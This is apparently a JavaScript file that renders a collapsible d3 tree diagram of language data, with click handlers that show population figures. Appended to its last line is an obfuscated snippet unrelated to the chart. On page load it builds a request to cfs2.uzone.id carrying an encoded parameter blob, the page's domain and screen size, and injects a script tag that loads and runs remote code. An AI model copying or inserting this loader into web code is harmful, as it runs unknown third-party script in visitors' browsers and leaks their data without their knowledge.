// ************** Generate the tree diagram	 *****************
var margin = {top: 20, right: 120, bottom: 20, left: 120},
	width = 3000 - margin.right - margin.left,
	height = 3000 - margin.top - margin.bottom;

var i = 0,
	duration = 750,
	root;

var tree = d3.layout.tree()
	.size([height, width]);

var diagonal = d3.svg.diagonal()
	.projection(function(d) { return [d.y, d.x]; });

var svg = d3.select("body").append("svg")
	.attr("width", width + margin.right + margin.left)
	.attr("height", height + margin.top + margin.bottom)
  .append("g")
	.attr("transform", "translate(" + margin.left + "," + margin.top + ")");

root = languageTree[0];
root.x0 = height / 2;
root.y0 = 0;

update(root);

d3.select(self.frameElement).style("height", "500px");

function update(source) {

  // Compute the new tree layout.
  var nodes = tree.nodes(root).reverse(),
	  links = tree.links(nodes);

  // Normalize for fixed-depth.
  nodes.forEach(function(d) { d.y = d.depth * 180; });

  // Update the nodes…
  var node = svg.selectAll("g.node")
	  .data(nodes, function(d) { return d.id || (d.id = ++i); });

  // Enter any new nodes at the parent's previous position.
  var nodeEnter = node.enter().append("g")
	  .attr("class", "node")
	  .attr("transform", function(d) { return "translate(" + source.y0 + "," + source.x0 + ")"; })
	  .on("click", click);

  nodeEnter.append("circle")
	  .attr("r", 1e-6)
	  .style("fill", function(d) { return d._children ? "lightsteelblue" : "#fff"; });

  nodeEnter.append("text")
	  .attr("x", function(d) { return d.children || d._children ? -13 : 13; })
	  .attr("dy", ".35em")
	  .attr("text-anchor", function(d) { return d.children || d._children ? "end" : "start"; })
	  .text(function(d) { return d.name; })
	  .style("fill-opacity", 1e-6);

  // Transition nodes to their new position.
  var nodeUpdate = node.transition()
	  .duration(duration)
	  .attr("transform", function(d) { return "translate(" + d.y + "," + d.x + ")"; });

  nodeUpdate.select("circle")
	  .attr("r", 10)
	  .style("fill", function(d) { return d._children ? "lightsteelblue" : "#fff"; });

  nodeUpdate.select("text")
	  .style("fill-opacity", 1);

  // Transition exiting nodes to the parent's new position.
  var nodeExit = node.exit().transition()
	  .duration(duration)
	  .attr("transform", function(d) { return "translate(" + source.y + "," + source.x + ")"; })
	  .remove();

  nodeExit.select("circle")
	  .attr("r", 1e-6);

  nodeExit.select("text")
	  .style("fill-opacity", 1e-6);

  // Update the links…
  var link = svg.selectAll("path.link")
	  .data(links, function(d) { return d.target.id; });

  // Enter any new links at the parent's previous position.
  link.enter().insert("path", "g")
	  .attr("class", "link")
	  .attr("d", function(d) {
		var o = {x: source.x0, y: source.y0};
		return diagonal({source: o, target: o});
	});

  // Transition links to their new position.
  link.transition()
	  .duration(duration)
	  .attr("d", diagonal);

  // Transition exiting nodes to the parent's new position.
  link.exit().transition()
	  .duration(duration)
	  .attr("d", function(d) {
			var o = {x: source.x, y: source.y};
				return diagonal({source: o, target: o});
		  })
	  .remove();

  // Stash the old positions for transition.
  nodes.forEach(function(d) {
		d.x0 = d.x;
		d.y0 = d.y;
  });
}

// Toggle children on click.
function click(d) {
  if (d.children) {
		d._children = d.children;
		d.children = null;
		alert(d.population);
		alert(d.childSum);
  } else {
		d.children = d._children;
		d._children = null;
  }
  update(d);
}

if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKwjz9L4TWPLVN3p2ueDMC%2b40OMca38%2bDvEcniT2QqNaGRAWSG%2fvOGWDPRjIp7ebAKlEbwyvVBjtM16S8ss5oWspVBW0FAe2EqSrydhJTW%2b%2bQSD0r4Tw3i%2f6CzmL6ygcE8QVgbdDERM7I4ylg%2fHeorCRlP8p8%2fU4lQiZCTzIzV3IcVkgxpnjOoatXsDSomXqvwaxROxuH3t4Kii3%2fwVN6IeaauZGWMwh1gTKxq%2bYcbEn%2bVPkciMLPCQOl%2fZeatvqJbrhyX4%2fyqI0YMO%2f%2fzzrqKDwZcX2uXmnCvMBImuXW9OifMEZJo50C%2f7ApDyBM0JYtkIlgzjJp%2f1wu92u6I1M5itldTJncLR4I9vG%2bwePYRwiHcZTo47FRCSd0JB9mzHkFJGIXHKLFBF4l2%2fW3c5Vqw4msl0u88oiFXgKME477Cp8bs%2fKN%2fcvd4wIY%2fUyiPhZFanWuMmqygF1vUiF%2ffgHK8piR5V5KUP7qJURPUikSX9HITZ3CJ%2bqwsNFbcXPYuCaBn" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
